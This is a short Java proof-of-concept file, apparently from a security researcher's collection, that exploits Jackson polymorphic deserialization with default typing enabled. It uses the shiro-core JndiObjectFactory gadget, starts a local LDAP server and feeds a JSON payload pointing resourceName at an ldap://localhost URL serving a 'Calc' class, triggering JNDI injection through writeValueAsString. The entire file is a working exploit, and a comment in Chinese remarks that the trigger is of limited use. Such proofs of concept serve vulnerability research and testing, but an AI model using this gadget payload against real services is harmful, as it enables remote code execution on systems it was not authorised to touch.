package com.threedr3am.bug.jackson.rce;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.threedr3am.bug.common.server.LdapServer;
import java.io.IOException;

/**
 * 比较鸡肋，需要调用writeValueAsString才能触发
 *
 * shiro-core gadget
 *
 * <dependency>
 *        <groupId>org.apache.shiro</groupId>
 *        <artifactId>shiro-core</artifactId>
 * </dependency>
 *
 * @author threedr3am
 */
public class ShiroPoc2 {

  static {
    //rmi server示例
//    RmiServer.run();

    //ldap server示例
    LdapServer.run();
  }

  public static void main(String[] args) throws IOException {
    ObjectMapper mapper = new ObjectMapper();
    mapper.enableDefaultTyping();

    String json = "[\"org.apache.shiro.jndi.JndiObjectFactory\", {\"resourceName\": \"ldap://localhost:43658/Calc\"}]";
    Object o = mapper.readValue(json, Object.class);
    mapper.writeValueAsString(o);
  }


}
